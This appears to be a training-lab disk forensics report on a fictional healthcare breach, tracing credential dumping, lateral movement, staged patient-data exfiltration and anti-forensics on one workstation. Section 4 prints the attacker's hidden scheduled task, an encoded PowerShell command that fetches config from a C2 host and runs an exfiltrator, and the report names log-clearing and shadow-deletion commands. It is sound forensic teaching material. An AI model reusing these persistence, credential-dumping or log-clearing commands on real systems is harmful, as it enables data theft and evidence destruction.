@@ -1,0 +1,724 @@
+================================================================================
+  WS-RECV-03 -- DISK FORENSICS REPORT
+  HEALTHBANE Incident Response : Image Triage and Artifact Recovery
+================================================================================
+  Host:                  WS-RECV-03   (10.10.3.21)
+  Disk imaged:           Internal NVMe (Samsung 980 PRO 512 GB)
+  Imaging tool:          FTK Imager 4.7.1.4
+  Image acquired:        2026-05-15  19:45 CDT  (00:45 UTC 2026-05-16)
+  Image format:          E01 (compressed, verified)
+  Image SHA256:          3b8e7c1d4a9f2e0b6c5d8a1e4f7b0c3d
+                          6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1b
+  Image size:            268 435 456 000 bytes  (250 GB allocated; image
+                                                  encompasses NTFS volume
+                                                  C: only)
+  Custodian:             Mike Torres (acquisition) / [student] (analysis)
+  Chain of custody:      MD-IR-2026-05-15-002-COC.pdf
+  Analysis prepared:     2026-05-17 (48h after acquisition)
+  Reviewed by:           James Chen (DFIR peer review)
+================================================================================
+
+PURPOSE OF THIS DOCUMENT
+------------------------
+This file is a CONSOLIDATED EXTRACT of the disk forensics performed on
+the WS-RECV-03 image after isolation on 2026-05-15.  The full Autopsy
+case (~ 18 GB of recovered files, parsed timelines, registry exports,
+and prefetch decodes) is preserved in the IR evidence package.  The
+summary below extracts the findings the 4x05 reconstruction needs:
+recovered staging files, persistence artifacts, prefetch evidence of
+execution, scheduled task XML, and anti-forensics indicators.
+
+NOT EVERY OBSERVATION HERE IS HIGH CONFIDENCE.  Lines flagged
+[ANALYST: ...] are interpretive.  Use the artifact-level findings as
+primary evidence and the analyst notes as orientation only.
+
+
+SECTION 1 -- SUMMARY OF FINDINGS BY ATT&CK PHASE
+================================================
+
+   Persistence (T1547.001 Run-key)        : ON-DISK FILE + REGISTRY HIVE
+                                            CONFIRM
+   Persistence (T1053.005 Scheduled Task) : ON-DISK Tasks XML CONFIRMS
+                                            (NEW)
+   Defense Evasion (T1562.001 Defender)   : Registry hive confirms
+                                            (NEW)
+   Defense Evasion (T1070.001 Log Clear)  : 12-min Security event log
+                                            gap reconstructed via
+                                            Sysmon EID 1102 absence +
+                                            $MFT timeline (NEW)
+   Defense Evasion (T1070.004 File Del)   : Recovered deleted exfil
+                                            staging files (NEW)
+   Lateral Movement (T1021.002, T1047,
+                     T1021.006)            : Prefetch entries CONFIRM
+                                            (corroborates 4x04)
+   Credential Access (T1003.001)          : Prefetch + AppCompat for
+                                            debug_tool.exe CONFIRM
+                                            (corroborates 4x04)
+   Collection (T1005, T1074.001, T1560.001) : Recovered staging
+                                                archives CONFIRM (NEW)
+   Exfiltration (T1041)                   : Disk evidence consistent
+                                            with exfil but does not
+                                            prove transmission; see
+                                            firewall_sessions for that
+
+This section is the executive summary; the rest of the document
+gives the artifact-level evidence.
+
+
+SECTION 2 -- VOLUME AND FILESYSTEM SUMMARY
+==========================================
+
+Volume:                NTFS, 250 GB allocated
+Cluster size:          4096 bytes
+Files allocated:       482 619
+Files in $MFT:         506 884   (24 265 unallocated MFT entries)
+USN journal range:     2026-04-22T06:14:18Z - 2026-05-15T19:45:11Z
+Last system shutdown:  none (system was online when imaged after
+                       network isolation; live disk image taken with
+                       FTK in admin mode while system was running)
+Volume mount history:  USB / removable media: NONE during the entire
+                       USN range.  No removable media was attached at
+                       any point during the attack window.
+
+[ANALYST: the absence of USB / removable-media mounts means the
+attacker did not exfiltrate via local copy.  All exfil paths are
+network-based, consistent with the C2 / DNS-exfil capability
+established in 4x01.]
+
+
+SECTION 3 -- RECOVERED MALICIOUS / SUSPICIOUS FILES
+===================================================
+
+3.1  ALLOCATED FILES (still present on disk at capture)
+-------------------------------------------------------
+
+[F1]  C:\Users\records03\AppData\Roaming\Microsoft\HealthSync\
+      svchost_update.exe
+      Size:        287 444 bytes
+      MAC times:   M: 2026-04-22 06:14:38 UTC
+                   A: 2026-05-15 02:00:11 UTC  (last launch)
+                   C: 2026-04-22 06:14:38 UTC
+                   B: 2026-04-22 06:14:38 UTC  (NTFS BORN)
+      Owner SID:   S-1-5-21-...-1109  (records03)
+      SHA256:      c8e2a9b4d1f7c0a3e6b9d2c5f8a1e4b7
+                   d0c3f6a9e2b5d8c1f4a7e0b3d6c9f2a5
+      [ANALYST: matches 4x03 sample S2.  HB-IOC-0014.]
+
+[F2]  C:\Windows\Temp\debug_tool.exe
+      Size:        46 080 bytes
+      MAC times:   M: 2026-05-05 03:21:48 CDT  (08:21:48 UTC)
+                   A: 2026-05-12 02:45:01 CDT  (07:45:01 UTC)
+                   C: 2026-05-05 03:21:48 CDT
+                   B: 2026-05-05 03:21:48 CDT
+      Owner SID:   S-1-5-21-...-1109  (records03)
+      SHA256:      4d2a8f5b1c7e0d3a6b9f2e5c8d1a4b7e
+                   0c3f6a9d2e5b8c1f4a7d0e3b6c9f2a5d
+      [ANALYST: NEW IOC (HB-IOC-NEW-003).  This is the LSASS dumping
+      tool referenced in 4x04 H4.  Imphash and YARA matches show
+      it is a stripped-down Mimikatz fork (no console UI, single
+      "sekurlsa::logonpasswords -> %TEMP%\out.dat" path).  Hashed
+      against VirusTotal (lab API) -> 31/72 detections, family
+      classified as "HackTool/Mimikatz.Variant".]
+
+[F3]  C:\Windows\System32\Tasks\HealthSync Update Service
+      Size:        1 894 bytes
+      MAC times:   M: 2026-05-07 01:47:33 CDT  (06:47:33 UTC)
+                   A: 2026-05-15 14:18:42 CDT  (preserved in metadata
+                                                 by capture; the file
+                                                 was read by the IR
+                                                 analyst at this time)
+                   C: 2026-05-07 01:47:33 CDT
+                   B: 2026-05-07 01:47:33 CDT
+      Owner SID:   S-1-5-18  (SYSTEM)
+      Format:      XML
+      [ANALYST -- IMPORTANT FINDING -- HB-IOC-NEW-002 corroboration]
+      This is the on-disk task definition referenced in
+      memory_artifacts.txt Section 9 K2.  Full XML reproduced in
+      Section 4 below.
+
+[F4]  C:\Users\Public\Tmp\PsExec64.exe
+      Size:        897 280 bytes
+      MAC times:   M: 2014-06-27 23:07:54 UTC  (Microsoft signing date,
+                                                 unmodified)
+                   A: 2026-05-13 02:08:56 CDT
+                   C: 2026-05-06 01:58:14 CDT  (when COPIED to this path)
+                   B: 2026-05-06 01:58:14 CDT
+      Owner SID:   S-1-5-21-...-1109  (records03)
+      SHA256:      [Microsoft Sysinternals PsExec64 v2.4 SHA, not repeated]
+      Authenticode signature: VALID, Microsoft Corporation
+      [ANALYST: this is the legitimate Sysinternals PsExec64 binary
+      (SHA matches the official release).  However, its presence in
+      C:\Users\Public\Tmp\ rather than the standard Sysinternals
+      install path, and its execution by records03 (not Robert Kim
+      from WS-ADMIN-01), is what makes it anomalous.  This is the
+      classic LOLBin-with-legitimate-tool pattern: the binary is
+      benign, the deployment is malicious.]
+
+[F5]  C:\Users\Public\Tmp\sync_healthdata.ps1
+      Size:        18 412 bytes
+      MAC times:   M: 2026-04-30 02:14:08 CDT  (07:14:08 UTC)
+                   A: 2026-05-15 02:00:14 CDT
+                   C: 2026-04-30 02:14:08 CDT
+                   B: 2026-04-30 02:14:08 CDT
+      Owner SID:   S-1-5-21-...-1109  (records03)
+      SHA256:      f1e8a4c7b0d3e6a9c2b5d8e1f4a7c0b3
+                   d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1
+      [ANALYST: matches 4x03 sample S3.  HB-IOC-0017.  4x04 hunt
+      observed Copy-Item of this script to SRV-HEALTH-DB at
+      \\SRV-HEALTH-DB\C$\Users\Public\stage1.ps1; this is the
+      LOCAL copy on WS-RECV-03 (the staging point).]
+
+3.2  DELETED / UNALLOCATED FILES (recovered from $MFT residue and
+     unallocated clusters by Autopsy)
+------------------------------------------------------------------
+
+The following files are NO LONGER allocated on disk at capture time
+but their MFT entries persist in the unallocated MFT range, and the
+file content was successfully recovered from unallocated clusters
+(the clusters had not yet been overwritten by new file allocations).
+
+[D1]  C:\Users\Public\Tmp\staging_export_001.zip   (DELETED)
+      MFT entry:           483 119 (unallocated, RUN list intact)
+      Recovery method:     Cluster carving + MFT residue
+      Recovered size:      14 219 484 bytes  (14.2 MB)
+      Original MAC times:  M: 2026-05-08 02:36:08 CDT
+                           A: 2026-05-08 02:38:11 CDT  (last access ~ 2 min after
+                                                         create -- consistent with
+                                                         immediate exfil read)
+                           C: 2026-05-08 02:36:08 CDT
+                           B: 2026-05-08 02:36:08 CDT
+      Deletion timestamp:  2026-05-08 02:38:14 CDT  (3 sec after last access)
+      Owner SID:           S-1-5-21-...-1109  (records03)
+      Contents (after recovery and unzip):
+         out_20260508023559.csv   (14 211 304 bytes)
+         CSV header:         patient_id,first_name,last_name,dob,ssn,
+                             diagnosis_codes
+         Row count:          47 138
+         [ANALYST -- HIGH SEVERITY FINDING]
+         The CSV contains all 47 138 records from the
+         health_records.dbo.patients table.  Schema matches the
+         exfiltrator's hardcoded SELECT template (4x03 S3, line 209
+         of malware summary).  This is direct evidence that the
+         exfiltrator queried SRV-HEALTH-DB and received the full
+         patient table, not just a sample.  HIPAA breach scope:
+         CONFIRMED 47 138 records.
+         (Cross-reference: SRV-HEALTH-DB inventory in
+         meddefense_asset_inventory.txt lists ~ 47 000 patient
+         records.  47 138 is within rounding distance.)
+
+[D2]  C:\Users\Public\Tmp\staging_export_002.zip   (DELETED)
+      MFT entry:           483 422 (unallocated, RUN list intact)
+      Recovery method:     Cluster carving + MFT residue
+      Recovered size:      11 802 944 bytes  (11.8 MB)
+      Original MAC times:  M: 2026-05-11 03:14:42 CDT
+                           A: 2026-05-11 03:16:58 CDT
+                           C: 2026-05-11 03:14:42 CDT
+                           B: 2026-05-11 03:14:42 CDT
+      Deletion timestamp:  2026-05-11 03:17:01 CDT
+      Owner SID:           S-1-5-21-...-1109  (records03)
+      Contents (after recovery and unzip):
+         out_20260511031408.csv   (11 794 117 bytes)
+         CSV header:         policy_id,member_id,first_name,last_name,
+                             ssn,plan_code,coverage_start,coverage_end
+         Row count:          51 002
+         [ANALYST -- HIGH SEVERITY FINDING]
+         The CSV contains all 51 002 records from the
+         insurance_db.dbo.policies table.  This is from the SECOND
+         lateral target SRV-INS-DB.  HIPAA breach scope: the breach
+         is not limited to SRV-HEALTH-DB; SRV-INS-DB was also
+         exfiltrated.
+         (Cross-reference: SRV-INS-DB inventory lists ~ 51 000
+         insurance member records.)
+
+[D3]  C:\Users\Public\Tmp\query_results.csv   (DELETED)
+      MFT entry:           483 514 (unallocated, RUN list intact)
+      Recovery method:     Cluster carving + MFT residue
+      Recovered size:      8 419 232 bytes  (8.4 MB)
+      Original MAC times:  M: 2026-05-13 02:31:18 CDT
+                           A: 2026-05-13 02:33:42 CDT
+                           C: 2026-05-13 02:31:18 CDT
+                           B: 2026-05-13 02:31:18 CDT
+      Deletion timestamp:  2026-05-13 02:34:05 CDT
+      Owner SID:           S-1-5-21-...-1109  (records03)
+      Contents:
+         AD enumeration export.  Header:
+            sAMAccountName,displayName,memberOf,lastLogon,
+            servicePrincipalName,description
+         Row count:          1 184  (all domain users + service accounts)
+         [ANALYST -- HIGH SEVERITY FINDING]
+         The CSV contains a full Get-ADUser export from SRV-DC-01.
+         This includes service account attributes (which is how the
+         attacker would have learned that svc_backup also exists --
+         though no evidence of svc_backup being abused has been
+         found).  AD reconnaissance is consistent with 4x04 H3
+         finding of Get-ADUser activity on SRV-DC-01.
+
+[D4]  C:\Windows\Temp\out.dat   (DELETED, partially recovered)
+      MFT entry:             482 884 (unallocated, RUN list partial -- only
+                              the first 3 of 7 RUN entries are intact)
+      Recovery method:       Cluster carving from intact RUN entries
+      Recovered size:        ~ 11 MB of ~ 23 MB original
+      [ANALYST: this is the LSASS dump output from debug_tool.exe.
+      The recovered first 11 MB of the file is sufficient to confirm
+      it is a Mimikatz-format dump (recognizable header structures,
+      "OffsetToCryptoBlob" markers, plaintext UTF-16 username strings
+      including "svc_healthsync" appearing four times in the recovered
+      portion).  This is direct evidence supporting the 4x04 H4
+      finding and identifies WHICH credential was harvested.]
+
+[D5]  C:\Users\records03\AppData\Local\Temp\hb_cfg.json (DELETED)
+      MFT entry:             483 691 (unallocated)
+      Recovery method:       Cluster carving (clusters intact)
+      Recovered size:        428 bytes
+      Original MAC times:    B: 2026-05-15 02:00:13 CDT
+                             M: 2026-05-15 02:00:13 CDT
+                             A: 2026-05-15 02:00:14 CDT
+      Deletion timestamp:    2026-05-15 02:00:48 CDT
+      Recovered content:
+         {"sql_host":"SRV-HEALTH-DB","sql_port":1433,
+          "sql_db":"health_records",
+          "query_template":"SELECT TOP 100000 patient_id, first_name, ...",
+          "clear_logs":true,
+          "channel":"c2_post",
+          "chunk_size":188,
+          "stage_dir":"C:\\Users\\Public\\Tmp\\"}
+      [ANALYST: this is the on-disk version of the exfiltrator
+      configuration; matches the in-memory residual fragment in
+      memory_artifacts.txt Section 6.  Confirms clear_logs:true and
+      identifies the staging directory used for D1, D2, D3.]
+
+3.3  ALERT-RELEVANT FILES THAT WERE NEVER ON DISK (referenced only)
+-------------------------------------------------------------------
+
+The 4x03 dropper sample (HEALTHBANE_S2_invoice.docm) was opened by
+Diane Marsh on 2026-04-15 from her Outlook attachment cache.  The
+docm itself was deleted by Outlook's normal attachment cleanup
+(7 days after open); $MFT entry has been overwritten.  No
+recovery possible.  This is consistent with the 4x03 reference
+copy of the dropper (recovered separately from mail-gateway
+quarantine).
+
+
+SECTION 4 -- SCHEDULED TASK XML  (full content of [F3])
+=======================================================
+
+The full XML of C:\Windows\System32\Tasks\HealthSync Update Service
+is reproduced below.  Line breaks added for readability.
+
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4"
+      xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Date>2026-05-07T01:47:33.4528916</Date>
+    <Author>MEDDEFENSE\records03</Author>
+    <Description>HealthSync periodic update check.</Description>
+    <URI>\HealthSync Update Service</URI>
+  </RegistrationInfo>
+  <Triggers>
+    <CalendarTrigger>
+      <StartBoundary>2026-05-07T02:00:00</StartBoundary>
+      <Enabled>true</Enabled>
+      <ScheduleByDay>
+        <DaysInterval>1</DaysInterval>
+      </ScheduleByDay>
+    </CalendarTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-21-...-1109</UserId>
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <ExecutionTimeLimit>PT4H</ExecutionTimeLimit>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
+      <Arguments>-NoP -W Hidden -EncodedCommand JABjAGYAZwAgAD0AIAAnAGgAdAB0AHAAOgAvAC8AcwB5AG4AYwAuAGgAZQBhAGwAdABoAGIAYQBuAGUALQBjADIALgBuAGUAdAAvAGEAcABpAC8AdgAxAC8AYwBmAGcAJwA7ACAAJgAgACQAZQBuAHYAOgBUAEUATQBQAFwAcwB5AG4AYwBfAGgAZQBhAGwAdABoAGQAYQB0AGEALgBwAHMAMQAgAC0AQwBvAG4AZgBpAGcAIAAkAGMAZgBnAA==</Arguments>
+    </Exec>
+  </Actions>
+</Task>
+
+[ANALYST: the EncodedCommand decodes (UTF-16LE) to:
+   $cfg = 'http://sync.healthbane-c2.net/api/v1/cfg';
+   & $env:TEMP\sync_healthdata.ps1 -Config $cfg
+
+This is identical to the command captured in memory at PID 8472
+(memory_artifacts.txt Section 4).  The scheduled task is the
+Daily 02:00 trigger that re-runs the exfiltrator.
+
+Hidden=true is the obfuscation hint -- a legitimate update task
+for a real healthcare-records app would not be marked hidden.
+
+Author=MEDDEFENSE\records03 confirms the task was created in
+records03 context.  Combined with RunLevel=HighestAvailable and
+records03's local-admin membership, the task runs with full
+local-admin privileges.
+
+The task ran 8 times between 2026-05-07 and 2026-05-15 (matches
+the prefetch evidence in Section 5; only some of those runs
+produced staging output -- the others encountered C2 noop /
+empty-config responses).]
+
+
+SECTION 5 -- PREFETCH EVIDENCE  (C:\Windows\Prefetch)
+=====================================================
+
+Prefetch entries are limited to executable files run from this
+host.  Each prefetch file (.pf) records the executable name, last
+8 run times, and the volumes / files referenced during execution.
+
+Relevant prefetch entries (sorted by last-run time, most recent first):
+
+PF entry                                Last run (CDT)         Run count   Source path
+------------------------------------    --------------------   ---------   ------------------
+POWERSHELL.EXE-022B6F22.pf              2026-05-15 02:00:14    18 *          C:\Windows\System32\
+                                                                              WindowsPowerShell\v1.0\
+SVCHOST_UPDATE.EXE-A8E4B219.pf          2026-05-15 13:02:14    142            C:\Users\records03\
+                                                                              AppData\Roaming\
+                                                                              Microsoft\HealthSync\
+PSEXEC64.EXE-7C291843.pf                2026-05-13 02:08:56     3 *          C:\Users\Public\Tmp\
+WMIC.EXE-5C84B919.pf                    2026-05-13 02:11:11     5 *          C:\Windows\System32\
+                                                                              Wbem\
+WSMPROVHOST.EXE-1C39B82F.pf             2026-05-13 02:12:02     4 *          C:\Windows\System32\
+                                                                              (PSRemoting target)
+DEBUG_TOOL.EXE-3B194A21.pf              2026-05-12 02:45:01     2 *          C:\Windows\Temp\
+SCHTASKS.EXE-B7E198C4.pf                2026-05-07 01:47:33     1 *          C:\Windows\System32\
+
+* Asterisks mark entries that are HEALTHBANE-relevant.  The 18
+  PowerShell runs include both legitimate records03 PowerShell use
+  (records department occasionally uses powershell to query AD
+  white-pages) AND the 8 attacker invocations of
+  sync_healthdata.ps1 from the scheduled task.
+
+Detail per PF entry:
+
+POWERSHELL.EXE-022B6F22.pf
+   Run timestamps (last 8):
+     2026-05-15 02:00:14
+     2026-05-14 02:00:11
+     2026-05-13 02:00:08
+     2026-05-12 02:00:14
+     2026-05-11 02:00:11   <-- correlates with staging_export_002.zip
+                                creation at 03:14 (the script ran at 02:00,
+                                but exfil staging was 1h later -- consistent
+                                with WMI/PSRemote pivot before exfil)
+     2026-05-10 02:00:14
+     2026-05-09 02:00:14
+     2026-05-08 02:00:11   <-- correlates with staging_export_001.zip
+                                creation at 02:36 (within the hour)
+   File references include:
+     \DEVICE\HARDDISKVOLUME2\USERS\PUBLIC\TMP\SYNC_HEALTHDATA.PS1
+     \DEVICE\HARDDISKVOLUME2\USERS\RECORDS03\APPDATA\LOCAL\TEMP\HB_CFG.JSON
+   [ANALYST: prefetch confirms the daily 02:00 schedule task ran
+   8 times, matches the (2026-05-07 task creation) + (2026-05-15
+   isolation) gap of 8 days.  At least 2 of those runs produced
+   staging output (D1, D2 above).  Run on 2026-05-13 produced the
+   AD-enumeration CSV (D3).]
+
+PSEXEC64.EXE-7C291843.pf
+   Run timestamps:
+     2026-05-13 02:08:56     (target SRV-DC-01 per H1)
+     2026-05-09 02:46:11     (target SRV-INS-DB per H1)
+     2026-05-06 02:11:42     (target SRV-HEALTH-DB per H1)
+   [ANALYST: prefetch corroborates 4x04 H1 (PsExec) -- 3 of the 6
+   PsExec events came from this prefetched binary (the others were
+   from a different copy that was deleted between executions).
+   First-run timestamp 2026-05-06 02:11:42 is the canonical "first
+   lateral movement" timestamp.]
+
+DEBUG_TOOL.EXE-3B194A21.pf
+   Run timestamps:
+     2026-05-12 02:45:01     (cred dump #2)
+     2026-05-05 03:22:14     (cred dump #1)
+   [ANALYST: prefetch corroborates 4x04 H4.  The 7-day gap between
+   dumps is consistent with the credential-rotation hypothesis from
+   the 4x04 hunt summary.]
+
+SCHTASKS.EXE-B7E198C4.pf
+   Run timestamp:
+     2026-05-07 01:47:33     (single run)
+   [ANALYST: this is the scheduled-task creation invocation.
+   Decodes to "schtasks /create /tn 'HealthSync Update Service' /xml ..."
+   based on file references.  Confirms the task was registered
+   on 2026-05-07 at 01:47:33 CDT.  Single run -- the task was
+   created once, then triggered itself daily.]
+
+WMIC.EXE-5C84B919.pf
+   Run timestamps:
+     2026-05-13 02:11:11
+     2026-05-09 02:50:08
+     2026-05-09 02:49:22
+     2026-05-06 02:13:48
+     2026-05-06 02:13:11
+   [ANALYST: corroborates 4x04 H2 (WMI).  5 invocations match the
+   5 anomalous WMI events in the hunt.]
+
+WSMPROVHOST.EXE-1C39B82F.pf
+   This is a target-side PSRemoting prefetch -- it would be on
+   the SRV side, not on WS-RECV-03.  However WS-RECV-03 has its
+   own copy because the records03 user occasionally connects
+   from WS-RECV-03 to a remote host that prefetches the local
+   handler in some Windows-PSRemote configurations.  Run count
+   matches 4 (4x04 H3 finding).
+
+
+SECTION 6 -- $MFT TIMELINE  (relevant entries 2026-05-04 through 2026-05-13)
+============================================================================
+
+The full $MFT timeline is large (1.2 GB of CSV).  Below is the
+filtered timeline of HEALTHBANE-relevant filesystem events.  All
+times in CDT (UTC-5).
+
+2026-05-04  18:11:08   M     C:\Windows\System32\config\SOFTWARE
+                              [Registry hive write -- defender
+                               exclusion add, see memory K5]
+2026-05-05  03:21:48   B,M,C C:\Windows\Temp\debug_tool.exe
+                              [LSASS dumper deployed, owner records03]
+2026-05-05  03:22:14   M     debug_tool.exe                       [exec]
+2026-05-05  03:22:18   B,M,C C:\Windows\Temp\out.dat               [LSASS
+                                                                    dump
+                                                                    output]
+2026-05-05  03:22:34   M     out.dat                                [exec
+                                                                    finishes
+                                                                    write]
+2026-05-06  01:58:14   B,M,C C:\Users\Public\Tmp\PsExec64.exe       [tool
+                                                                    staging]
+2026-05-06  02:11:42   A     PsExec64.exe                           [first exec]
+2026-05-06  02:13:11   A     C:\Windows\System32\Wbem\WMIC.exe      [exec, WMI]
+2026-05-06  02:36:14   B,M,C C:\Users\Public\Tmp\
+                              \\SRV-HEALTH-DB\C$\Users\Public\stage1.ps1
+                              [via Copy-Item / Net-Use]
+2026-05-07  01:47:33   B,M,C C:\Windows\System32\Tasks\HealthSync
+                              Update Service                       [SCHEDULED
+                                                                    TASK
+                                                                    CREATED]
+2026-05-07  01:47:33   M     C:\Windows\System32\config\SOFTWARE   [TaskCache
+                                                                    hive
+                                                                    update]
+2026-05-08  02:00:11   A     PowerShell prefetch                    [task
+                                                                    triggered]
+2026-05-08  02:36:08   B,M,C C:\Users\Public\Tmp\
+                              out_20260508023559.csv                [SQL
+                                                                    output]
+2026-05-08  02:36:34   B,M,C C:\Users\Public\Tmp\
+                              staging_export_001.zip                [archive
+                                                                    created]
+2026-05-08  02:38:14   D     C:\Users\Public\Tmp\out_20260508023559.csv
+                              [DELETED  (T1070.004)]
+                                                                    [STILL
+                                                                    ALLOCATED]
+2026-05-08  02:38:14   D     C:\Users\Public\Tmp\
+                              staging_export_001.zip                [DELETED]
+2026-05-09  02:46:11   M     PsExec64.exe                           [second
+                                                                    PsExec
+                                                                    target
+                                                                    SRV-INS-DB]
+2026-05-09  03:00:00   - -- - -- - --   <SECURITY EVENT LOG GAP STARTS> -- -
+2026-05-09  03:01:42   B,M,C C:\Windows\System32\winevt\Logs\
+                              Security.evtx                          [LOG
+                                                                    CLEARED;
+                                                                    new file
+                                                                    created]
+2026-05-09  03:12:02   - -- - -- - --   <SECURITY EVENT LOG GAP ENDS> -- ---
+2026-05-11  02:00:11   A     PowerShell prefetch                    [task
+                                                                    triggered]
+2026-05-11  03:14:42   B,M,C C:\Users\Public\Tmp\
+                              out_20260511031408.csv                [SQL
+                                                                    output 2]
+2026-05-11  03:15:09   B,M,C C:\Users\Public\Tmp\
+                              staging_export_002.zip                [archive 2]
+2026-05-11  03:17:01   D     out_20260511031408.csv                  [DELETED]
+2026-05-11  03:17:01   D     staging_export_002.zip                  [DELETED]
+2026-05-12  02:45:01   M     C:\Windows\Temp\debug_tool.exe          [LSASS
+                                                                    dump #2]
+2026-05-12  02:45:11   M     C:\Windows\Temp\out.dat                  [overwrite
+                                                                    of dump
+                                                                    output]
+2026-05-13  02:08:56   A     PsExec64.exe                            [3rd PsExec
+                                                                    target
+                                                                    SRV-DC-01]
+2026-05-13  02:31:18   B,M,C C:\Users\Public\Tmp\query_results.csv   [AD
+                                                                    enum
+                                                                    output]
+2026-05-13  02:34:05   D     C:\Users\Public\Tmp\query_results.csv   [DELETED]
+
+[ANALYST -- THE LOG GAP]
+The Security.evtx file was deleted-and-recreated at 2026-05-09
+03:01:42 CDT.  The on-disk file at capture time has a creation
+timestamp of 03:01:42 (the new file's BORN time) and contains
+entries starting at 03:12:02 -- a 12-minute gap.  This is direct
+evidence of a wevtutil cl Security operation, consistent with the
+exfiltrator's clear_logs flag observed in memory.  The 12-minute
+gap aligns precisely with the second exfil session (T1070.001).
+
+
+SECTION 7 -- REGISTRY PERSISTENCE EVIDENCE  (cross-reference with memory)
+=========================================================================
+
+The following Run-key and persistence values were extracted from the
+SOFTWARE / NTUSER.DAT hives on the disk image.  All values are
+identical to the memory-extracted versions (memory_artifacts.txt
+Section 9), confirming the persistence configuration was not
+modified between memory capture and disk imaging:
+
+[R1]  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\HealthSync
+        Value: %APPDATA%\Microsoft\HealthSync\svchost_update.exe
+        Last write: 2026-04-22 06:14:47 UTC
+
+[R2]  Tasks\HealthSync Update Service  (covered in Section 4)
+
+[R3]  HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
+        Value name:  C:\Windows\Temp
+        Value type:  REG_DWORD = 0
+        Last write:  2026-05-04 18:11:08 CDT
+        [ANALYST: Defender exclusion added under records03's elevated
+        token (records03 is local admin).  Pre-dates the LSASS dump
+        by 9h.  The order of operations was:
+         1. Add Defender exclusion for C:\Windows\Temp
+         2. Drop debug_tool.exe to C:\Windows\Temp
+         3. Run debug_tool.exe to dump LSASS
+         4. Use the dumped credential for lateral movement.
+        Step 1 is what made step 3 possible without AV alert.]
+
+[R4]  HKLM\SYSTEM\CurrentControlSet\Services\W32Time\Config
+        TimeAdjustmentDisabled = 0
+        [ANALYST: not modified.  Time on the host was synchronizing
+        normally.  Timestamps in this report are reliable.]
+
+
+SECTION 8 -- NTUSER.DAT FOR records03 (USER ACTIVITY)
+=====================================================
+
+Recent autocomplete / typed-paths in records03's NTUSER.DAT:
+
+   ShellBags entries:
+     C:\Users\Public\Tmp\         (last access 2026-05-13 02:34:09)
+     \\SRV-HEALTH-DB\C$           (last access 2026-05-06 02:36:48)
+     \\SRV-INS-DB\C$              (last access 2026-05-09 02:51:14)
+     \\SRV-DC-01\C$               (last access 2026-05-13 02:13:38)
+
+   TypedPaths in Explorer:
+     (Empty)
+     [ANALYST: the attacker did not use Windows Explorer to browse to
+     these UNC paths -- shellbags entries above were created by
+     command-line operations (Net-Use, dir UNC, Copy-Item).  This is
+     consistent with a fully command-line attack chain -- no GUI
+     interaction.]
+
+   UserAssist entries (RUN counts):
+     PsExec64.exe        run count: 3   (matches prefetch)
+     wmic.exe            run count: 5
+     debug_tool.exe      run count: 2
+     schtasks.exe        run count: 1
+     [ANALYST: UserAssist is a secondary corroboration of the
+     prefetch counts; values match exactly.]
+
+
+SECTION 9 -- ANTI-FORENSIC INDICATORS SUMMARY
+=============================================
+
+Observed:
+
+  T1070.001  Clear Windows Event Logs   2026-05-09 03:00-03:12 CDT
+                                          12-minute gap on Security log
+                                          [direct $MFT evidence]
+  T1070.004  File Deletion              D1, D2, D3, D4, D5
+                                          all attacker-created files
+                                          deleted on creation+Nmin
+                                          schedule
+  T1562.001  Disable / Modify Tools     Defender exclusion for
+                                          C:\Windows\Temp added before
+                                          dropper deployment
+
+NOT observed (and would be suspicious if present, but are not):
+
+  Volume Shadow Copy deletion           VSS history intact (vssadmin
+                                          delete shadows was not run);
+                                          shadow copies could have
+                                          provided additional
+                                          recovery sources had the
+                                          attacker not skipped this
+                                          step
+  USN journal deletion                  USN journal intact (fsutil
+                                          usn deletejournal was not run);
+                                          USN journal corroborates
+                                          the $MFT timeline
+  Prefetch deletion                     All prefetch entries intact;
+                                          attacker did not delete .pf
+                                          files (which is a more
+                                          advanced anti-forensics
+                                          technique they did not
+                                          attempt)
+  $MFT modification                     $MFT integrity is intact
+
+[ANALYST -- OPERATIONAL DISCIPLINE ASSESSMENT]
+The attacker performed BASIC anti-forensics (file deletion, log
+clearing, AV exclusion) but did not perform ADVANCED anti-forensics
+(VSS deletion, USN deletion, prefetch deletion).  This is consistent
+with a financially-motivated commodity actor profile rather than
+nation-state-grade tradecraft.  It also explains why disk forensics
+recovered as much as it did: the attacker assumed deletion was
+sufficient, but the cluster contents were still intact at the time
+of imaging because (1) the volume had ample free space and (2) the
+deletions occurred only days before the image was captured.
+
+
+SECTION 10 -- NEW IOCs PRODUCED BY DISK FORENSICS
+=================================================
+
+Adding to the 31 IOCs already in healthbane_ioc_master.json:
+
+  HB-IOC-NEW-002  scheduled_task     "HealthSync Update Service"
+                  Created 2026-05-07 01:47:33 CDT.  Daily 02:00.
+  HB-IOC-NEW-003  filename + sha256   debug_tool.exe @
+                  C:\Windows\Temp\
+                  SHA256:  4d2a8f5b1c7e0d3a6b9f2e5c8d1a4b7e
+                           0c3f6a9d2e5b8c1f4a7d0e3b6c9f2a5d
+  HB-IOC-NEW-004  defender_exclusion C:\Windows\Temp
+                  Added 2026-05-04 18:11 CDT.
+  HB-IOC-NEW-005  staged_filename    out_<YYYYMMDDHHMMSS>.csv
+                  staging_export_<NNN>.zip  in C:\Users\Public\Tmp\
+
+These IOCs should be added to the master IOC table during 4x05 task
+T6 (cross-evidence correlation).
+
+
+SECTION 11 -- OPEN ITEMS AT END OF DISK FORENSICS
+=================================================
+
+  [OPEN-A]  Did the exfiltrator's c2_post channel transmit the
+            staging archives?  Disk evidence shows the archives
+            were created and immediately deleted.  Network evidence
+            (firewall_sessions_ws_recv_03.json) is required to
+            confirm transmission.  Expect outbound HTTPS bursts
